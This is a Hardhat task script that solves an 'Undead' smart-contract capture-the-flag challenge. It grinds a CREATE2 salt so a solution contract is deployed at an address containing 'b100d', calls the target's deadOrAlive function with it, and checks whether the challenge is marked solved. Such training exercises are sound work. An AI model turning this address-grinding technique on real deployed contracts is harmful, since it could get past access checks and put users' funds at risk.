import { findSaltToMatch } from "../scripts/utils/findAddress";
import { task, types } from "hardhat/config";
import { HardhatRuntimeEnvironment, TaskArguments } from "hardhat/types";
import { UndeadSolutionFactory, Undead } from "../typechain";

task("solveUndead", "Solves the Undead challenge")
    .addParam("undeadAddress", "Address of the exploitable contract", undefined, types.string, false)
    .setAction(async (args: TaskArguments, hre: HardhatRuntimeEnvironment) => {
        if (!hre.ethers.utils.isAddress(args.undeadAddress)) {
            throw new Error(`Invalid contract address format: ${args.undeadAddress}`);
        }

        const UndeadSolutionCreate2Factory = await hre.ethers.getContractFactory("UndeadSolutionFactory");
        const undeadSolutionCreate2Factory = (await UndeadSolutionCreate2Factory.deploy()) as UndeadSolutionFactory;

        const UndeadSolutionFactory = await hre.ethers.getContractFactory("UndeadSolution");

        const [salt, address] = findSaltToMatch(
            hre,
            undeadSolutionCreate2Factory.address,
            UndeadSolutionFactory.bytecode,
            "b100d",
        );

        if (!salt || !address) {
            throw new Error("Could not find a salt to match the address");
        }

        console.log(`Found salt: ${salt}`);
        console.log(`Found address: ${address}`);

        await undeadSolutionCreate2Factory.deploy(salt);

        const undeadSolutionAddress = await undeadSolutionCreate2Factory.latestDeploy();

        console.log(`Deployed UndeadSolution at address: ${undeadSolutionAddress}`);

        const UndeadChallengeFactory = await hre.ethers.getContractFactory("undead");
        const undeadChallenge = (await UndeadChallengeFactory.attach(args.undeadAddress)) as Undead;

        console.log(`Attempting hack...`);
        await undeadChallenge.deadOrAlive(undeadSolutionAddress);

        const id = hre.ethers.utils.solidityKeccak256(["address"], [undeadSolutionAddress]);
        console.log(`Calculated address id: ${id}`);

        const isPwnd = await undeadChallenge.UnDeAD(id);
        if (isPwnd) {
            console.log("Challenge solved!");
        } else {
            console.log("Challenge not solved!");
        }
    });
